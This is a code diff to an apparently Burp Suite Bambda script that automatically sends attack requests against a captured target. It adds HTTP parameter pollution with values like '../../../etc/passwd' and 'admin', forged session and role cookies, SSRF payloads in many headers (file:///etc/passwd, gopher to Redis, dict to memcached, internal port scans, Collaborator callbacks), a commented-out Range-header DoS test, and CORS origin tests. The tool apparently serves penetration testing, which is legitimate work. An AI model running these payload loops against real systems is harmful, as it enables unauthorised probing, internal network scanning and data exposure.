@@ -59,7 +59,26 @@ String[] HOST_PAYLOADS = {
     "localhost",
     "127.0.0.1",
     "0.0.0.0",
-    "internal.local"
+    "127.0.0.1:80",
+    "127.0.0.1:22",
+    "127.0.0.1:3306",
+    "127.0.0.1:6379",
+    "127.0.0.1:9200",
+    "localhost:80",
+    "0.0.0.0:80",
+    "[::1]:80",
+    "10.0.0.1",
+    "192.168.1.1",
+    "172.16.0.1",
+    "127.1",
+    "2130706433", // 127.0.0.1 in decimal
+    "0x7f000001", // 127.0.0.1 in hex
+    "127.000.000.1",
+    "127.0.0.1%2e80",
+    "127.0.0.1%252e80",
+    "127.0.0.1%25%32%65%38%30",
+    "[::ffff:127.0.0.1]",
+    "[0:0:0:0:0:ffff:127.0.0.1]"
 };
 
 // CRLF Injection Payloads
@@ -477,6 +496,436 @@ if (originalBody.length() > 0) {
         totalRequests++;
     } catch (Exception e) {
         logging.logToError("Error with Double Content-Length: " + e.getMessage());
+    }
+}
+
+// Additional Test Cases for your HTTP Attack Bambda
+
+// -------------------------- Test 13: Parameter Pollution (HPP) -------------------- //
+logging.logToOutput("[ === Testing HTTP Parameter Pollution === ]");
+
+// Test HPP for GET requests
+if (originalRequest.method().equals("GET") && originalRequest.path().contains("?")) {
+    try {
+        String originalPath = originalRequest.path();
+        String[] pathParts = originalPath.split("\\?", 2);
+        if (pathParts.length == 2) {
+            String basePath = pathParts[0];
+            String queryString = pathParts[1];
+            
+            // Extract existing parameters and duplicate them with different values
+            String[] params = queryString.split("&");
+            StringBuilder pollutedQuery = new StringBuilder(queryString);
+            
+            for (String param : params) {
+                if (param.contains("=")) {
+                    String paramName = param.split("=")[0];
+                    // Add duplicate parameter with malicious values
+                    pollutedQuery.append("&").append(paramName).append("=admin");
+                    pollutedQuery.append("&").append(paramName).append("=../../../etc/passwd");
+                    pollutedQuery.append("&").append(paramName).append("=true");
+                }
+            }
+            
+            String pollutedPath = basePath + "?" + pollutedQuery.toString();
+            var hppRequest = originalRequest.withPath(pollutedPath);
+            var response = api.http().sendRequest(hppRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = response.response().statusCode();
+            String result = "HTTP Parameter Pollution in GET";
+            logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+            
+            var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(hppRequest, response.response());
+            requestResponseForOrganizer.annotations().setNotes(result);
+            api.organizer().sendToOrganizer(requestResponseForOrganizer);
+            totalRequests++;
+        }
+    } catch (Exception e) {
+        logging.logToError("Error with HPP GET: " + e.getMessage());
+    }
+}
+
+// Test HPP for POST requests with form data
+if (originalRequest.method().equals("POST") && originalRequest.body().length() > 0) {
+    String contentType = originalRequest.headerValue("Content-Type");
+    if (contentType != null && contentType.contains("application/x-www-form-urlencoded")) {
+        try {
+            String originalBodyStr = new String(originalRequest.body().getBytes());
+            String[] params = originalBodyStr.split("&");
+            StringBuilder pollutedBody = new StringBuilder(originalBodyStr);
+            
+            for (String param : params) {
+                if (param.contains("=")) {
+                    String paramName = param.split("=")[0];
+                    // Add duplicate parameters with different values
+                    pollutedBody.append("&").append(paramName).append("=admin");
+                    pollutedBody.append("&").append(paramName).append("=true");
+                    pollutedBody.append("&").append(paramName).append("=1");
+                }
+            }
+            
+            var hppRequest = originalRequest.withBody(pollutedBody.toString());
+            var response = api.http().sendRequest(hppRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = response.response().statusCode();
+            String result = "HTTP Parameter Pollution in POST Form";
+            logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+            
+            var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(hppRequest, response.response());
+            requestResponseForOrganizer.annotations().setNotes(result);
+            api.organizer().sendToOrganizer(requestResponseForOrganizer);
+            totalRequests++;
+        } catch (Exception e) {
+            logging.logToError("Error with HPP POST Form: " + e.getMessage());
+        }
+    }
+    
+    // Test HPP for JSON data
+    if (contentType != null && contentType.contains("application/json")) {
+        try {
+            String originalBodyStr = new String(originalRequest.body().getBytes());
+            
+            // Method 1: Duplicate entire JSON object
+            if (originalBodyStr.trim().startsWith("{") && originalBodyStr.trim().endsWith("}")) {
+                String duplicatedJson = "[" + originalBody + "," + originalBodyStr.replace(":", "_hpp:") + "]";
+                
+                var hppJsonRequest1 = originalRequest.withBody(duplicatedJson);
+                var response1 = api.http().sendRequest(hppJsonRequest1);
+                Thread.sleep(GLOBAL_DELAY_MS);
+                
+                int status1 = response1.response().statusCode();
+                String result1 = "HTTP Parameter Pollution JSON - Array Duplication";
+                logging.logToOutput("[ === " + result1 + " -> Status: " + status1 + " === ]");
+                
+                var requestResponseForOrganizer1 = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(hppJsonRequest1, response1.response());
+                requestResponseForOrganizer1.annotations().setNotes(result1);
+                api.organizer().sendToOrganizer(requestResponseForOrganizer1);
+                totalRequests++;
+            }
+            
+            // Method 2: Parse and duplicate JSON keys
+            if (originalBodyStr.trim().startsWith("{") && originalBodyStr.trim().endsWith("}")) {
+                StringBuilder pollutedJson = new StringBuilder();
+                String cleanedJson = originalBodyStr.trim();
+                cleanedJson = cleanedJson.substring(1, cleanedJson.length() - 1); // Remove braces
+                
+                pollutedJson.append("{");
+                pollutedJson.append(cleanedJson); // Original content
+                
+                // Split by comma to get key-value pairs and duplicate them
+                String[] pairs = cleanedJson.split(",");
+                for (String pair : pairs) {
+                    String trimmedPair = pair.trim();
+                    int firstColonIndex = trimmedPair.indexOf(':');
+                    if (firstColonIndex > 0) {
+                        String key = trimmedPair.substring(0, firstColonIndex).trim();
+                        String keyName = key.replace("\"", "");
+                        
+                        // Add duplicate keys with different values
+                        pollutedJson.append(",").append(key).append(": \"admin\"");
+                        pollutedJson.append(",").append(key).append(": \"true\"");
+                        pollutedJson.append(",").append(key).append(": \"1\"");
+                        pollutedJson.append(",").append("\"").append(keyName).append("_hpp\"").append(": \"injected\"");
+                    }
+                }
+                pollutedJson.append("}");
+                
+                var hppJsonRequest2 = originalRequest.withBody(pollutedJson.toString());
+                var response2 = api.http().sendRequest(hppJsonRequest2);
+                Thread.sleep(GLOBAL_DELAY_MS);
+                
+                int status2 = response2.response().statusCode();
+                String result2 = "HTTP Parameter Pollution JSON - Key Duplication";
+                logging.logToOutput("[ === " + result2 + " -> Status: " + status2 + " === ]");
+                
+                var requestResponseForOrganizer2 = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(hppJsonRequest2, response2.response());
+                requestResponseForOrganizer2.annotations().setNotes(result2);
+                api.organizer().sendToOrganizer(requestResponseForOrganizer2);
+                totalRequests++;
+            }
+            
+            // Method 3: JSON with conflicting data types
+            if (originalBodyStr.trim().startsWith("{") && originalBodyStr.trim().endsWith("}")) {
+                String typeConflictJson = originalBodyStr;
+                
+                // Add the same keys with different data types
+                String cleanedJson = originalBodyStr.trim();
+                cleanedJson = cleanedJson.substring(1, cleanedJson.length() - 1);
+                
+                StringBuilder conflictJson = new StringBuilder("{");
+                conflictJson.append(cleanedJson);
+                
+                String[] pairs = cleanedJson.split(",");
+                for (String pair : pairs) {
+                    String trimmedPair = pair.trim();
+                    int firstColonIndex = trimmedPair.indexOf(':');
+                    if (firstColonIndex > 0) {
+                        String key = trimmedPair.substring(0, firstColonIndex).trim();
+                        
+                        // Add same key with different data types
+                        conflictJson.append(",").append(key).append(": true");      // boolean
+                        conflictJson.append(",").append(key).append(": 999");       // number
+                        conflictJson.append(",").append(key).append(": []");        // array
+                        conflictJson.append(",").append(key).append(": {}");        // object
+                        conflictJson.append(",").append(key).append(": null");      // null
+                    }
+                }
+                conflictJson.append("}");
+                
+                var hppJsonRequest3 = originalRequest.withBody(conflictJson.toString());
+                var response3 = api.http().sendRequest(hppJsonRequest3);
+                Thread.sleep(GLOBAL_DELAY_MS);
+                
+                int status3 = response3.response().statusCode();
+                String result3 = "HTTP Parameter Pollution JSON - Type Confusion";
+                logging.logToOutput("[ === " + result3 + " -> Status: " + status3 + " === ]");
+                
+                var requestResponseForOrganizer3 = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(hppJsonRequest3, response3.response());
+                requestResponseForOrganizer3.annotations().setNotes(result3);
+                api.organizer().sendToOrganizer(requestResponseForOrganizer3);
+                totalRequests++;
+            }
+            
+        } catch (Exception e) {
+            logging.logToError("Error with HPP JSON: " + e.getMessage());
+        }
+    }
+}
+
+// -------------------------- Test 14: Adding custom cookies -------------------- //
+logging.logToOutput("[ === Testing CUSTOM COOKIES === ]");
+
+// Test 2: Add common session/auth cookies if they don't exist
+String[] commonSessionCookies = {
+    "JSESSIONID=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "PHPSESSID=admin",
+    "session_id=../../../etc/passwd", 
+    "auth_token=admin",
+    "remember_me=1",
+    "admin=true",
+    "role=administrator",
+    "user=admin",
+    "authenticated=true",
+    "csrf_token=",
+    "session=hijacked"
+};
+
+for (String testCookie : commonSessionCookies) {
+    try {
+        String newCookieHeader = " ";
+        //String originalCookie = originalHeaders.size();
+        for (HttpHeader header : originalHeaders) {
+        	if (header.name().equals("Cookie")) {newCookieHeader = header.toString();}    
+        }
+        if (newCookieHeader.equals(" ")) {
+            newCookieHeader = newCookieHeader + "; " + testCookie;
+        } else {
+            newCookieHeader = testCookie;
+        }
+        
+        var cookieRequest = originalRequest.withHeader("Cookie", newCookieHeader);
+        var response = api.http().sendRequest(cookieRequest);
+        Thread.sleep(GLOBAL_DELAY_MS);
+        
+        int status = response.response().statusCode();
+        String result = "Additional Cookie: " + testCookie.split("=")[0];
+        logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+        
+        var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(cookieRequest, response.response());
+        requestResponseForOrganizer.annotations().setNotes(result);
+        api.organizer().sendToOrganizer(requestResponseForOrganizer);
+        totalRequests++;
+    } catch (Exception e) {
+        logging.logToError("Error with Additional Cookie: " + e.getMessage());
+    }
+}
+
+
+// -------------------------- Test 21: Server-Side Request Forgery (SSRF) -------------------- //
+logging.logToOutput("[ === Testing SSRF in Headers === ]");
+
+String[] ssrfPayloads = {
+    // Internal network discovery
+    "http://127.0.0.1:80",
+    "http://127.0.0.1:22",
+    "http://127.0.0.1:3306",
+    "http://127.0.0.1:6379",
+    "http://127.0.0.1:9200",
+    "http://localhost:80",
+    "http://0.0.0.0:80",
+    "http://[::1]:80",
+    
+    // Private IP ranges
+    "http://10.0.0.1",
+    "http://192.168.1.1",
+    "http://172.16.0.1",
+
+    // Protocol bypass attempts
+    "https://127.0.0.1",
+    "ftp://127.0.0.1",
+    "file:///etc/passwd",
+    "gopher://127.0.0.1:6379/_INFO",
+    "dict://127.0.0.1:11211/stats",
+    "ldap://127.0.0.1:389",
+    
+    // URL encoding bypass
+    "http://127.1",
+    "http://2130706433", // 127.0.0.1 in decimal
+    "http://0x7f000001", // 127.0.0.1 in hex
+    "http://127.000.000.1",
+    "http://127.0.0.1.xip.io",
+    
+    // DNS rebinding
+    "http://localtest.me",
+    "http://127.0.0.1.nip.io",
+    "http://lvh.me",
+    
+    // Burp Collaborator (external detection)
+    "http://" + hostname,
+    "https://" + hostname,
+    
+    // Bypass attempts with encoding
+    "http://127.0.0.1%2e80",
+    "http://127.0.0.1%252e80",
+    "http://127.0.0.1%25%32%65%38%30",
+    
+    // IPv6 bypass
+    "http://[::ffff:127.0.0.1]",
+    "http://[0:0:0:0:0:ffff:127.0.0.1]",
+    
+    // Port scanning payloads
+    "http://127.0.0.1:21",
+    "http://127.0.0.1:23",
+    "http://127.0.0.1:25",
+    "http://127.0.0.1:53",
+    "http://127.0.0.1:110",
+    "http://127.0.0.1:143",
+    "http://127.0.0.1:993",
+    "http://127.0.0.1:995"
+};
+
+String[] ssrfHeaders = {
+    "Referer",
+    "X-Forwarded-For",
+    "X-Forwarded-Host", 
+    "X-Real-IP",
+    "X-Original-URL",
+    "X-Rewrite-URL",
+    "Origin",
+    "X-Arbitrary-Header",
+    "Webhook-URL",
+    "Callback-URL",
+    "Image-URL",
+    "Link",
+    "Location"
+};
+
+for (String ssrfHeader : ssrfHeaders) {
+    for (String ssrfPayload : ssrfPayloads) {
+        try {
+            var ssrfRequest = originalRequest.withHeader(ssrfHeader, ssrfPayload);
+            var response = api.http().sendRequest(ssrfRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = response.response().statusCode();
+            String result = "SSRF Test - " + ssrfHeader + ": " + ssrfPayload;
+            logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+            
+            var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(ssrfRequest, response.response());
+            requestResponseForOrganizer.annotations().setNotes(result);
+            api.organizer().sendToOrganizer(requestResponseForOrganizer);
+            totalRequests++;
+        } catch (Exception e) {
+            logging.logToError("Error with SSRF: " + e.getMessage());
+        }
+    }
+}
+
+// -------------------------- Test 18: Range Header Attacks -------------------- //
+//logging.logToOutput("[ === Testing Range Header Attacks === ]");
+
+// Only test Range header if the original request is GET (ranges don't make sense for POST/PUT etc.)
+//if (originalRequest.method().equals("GET")) {
+//    String[] rangePayloads = {
+//        "bytes=0-",                                    // Read from start
+//        "bytes=0-1",                                   // Small range
+//        "bytes=-1",                                    // Last byte
+//        "bytes=0-0",                                   // Single byte
+//        "bytes=999999999999999999999-",                // Huge range start
+//        "bytes=0-999999999999999999999",               // Huge range end
+//        "bytes=0-1,2-3,4-5,6-7,8-9,10-11,12-13,14-15,16-17,18-19", // Multiple ranges
+//        "bytes=" + "0-1,".repeat(100) + "2-3",        // Many ranges (DoS)
+//        "bytes=" + "0-1,".repeat(1000) + "2-3",       // Excessive ranges (DoS)
+//        "bytes=--1",                                   // Malformed
+//        "bytes=abc-def",                               // Non-numeric
+//        "bytes=0-abc",                                 // Partial non-numeric
+//        "bytes=0-1-2",                                 // Extra dash
+//        "bytes=1-0",                                   // Reverse range
+//        "bytes=0-1,0-1,0-1,0-1,0-1"                  // Overlapping ranges
+//    };
+//
+//    for (String rangePayload : rangePayloads) {
+//        try {
+//            var rangeRequest = originalRequest.withHeader("Range", rangePayload);
+//            var response = api.http().sendRequest(rangeRequest);
+//            Thread.sleep(GLOBAL_DELAY_MS);
+//            
+//            int status = response.response().statusCode();
+//            long responseLength = response.response().body().length();
+//            
+//            String result = "Range Header: " + (rangePayload.length() > 50 ? 
+//                rangePayload.substring(0, 50) + "..." : rangePayload) + 
+//                " (Resp len: " + responseLength + ")";
+//            logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+//            
+//            var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(rangeRequest, response.response());
+//            requestResponseForOrganizer.annotations().setNotes(result);
+//            api.organizer().sendToOrganizer(requestResponseForOrganizer);
+//            totalRequests++;
+//        } catch (Exception e) {
+//            logging.logToError("Error with Range Header: " + e.getMessage());
+//        }
+//    }
+//} else {
+//    logging.logToOutput("[ === Skipping Range Header tests - not a GET request === ]");
+//}
+
+// -------------------------- Test 20: CORS Preflight Manipulation -------------------- //
+logging.logToOutput("[ === Testing CORS Preflight Manipulation === ]");
+
+String[] corsOrigins = {
+    "https://"+hostname,
+    "https://" + httpService.host() + "." + hostname,
+    "https://sub." + httpService.host(),
+    "null",
+    "*",
+    "file://",
+    "data:",
+    "https://localhost"
+};
+
+for (String origin : corsOrigins) {
+    try {
+        var corsRequest = originalRequest
+            .withHeader("Origin", origin)
+            .withHeader("Access-Control-Request-Method", "PUT")
+            .withHeader("Access-Control-Request-Headers", "X-Custom-Header");
+        
+        var response = api.http().sendRequest(corsRequest);
+        Thread.sleep(GLOBAL_DELAY_MS);
+        
+        int status = response.response().statusCode();
+        String result = "CORS Preflight: " + origin;
+        logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+        
+        var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(corsRequest, response.response());
+        requestResponseForOrganizer.annotations().setNotes(result);
+        api.organizer().sendToOrganizer(requestResponseForOrganizer);
+        totalRequests++;
+    } catch (Exception e) {
+        logging.logToError("Error with CORS Test: " + e.getMessage());
     }
 }
 
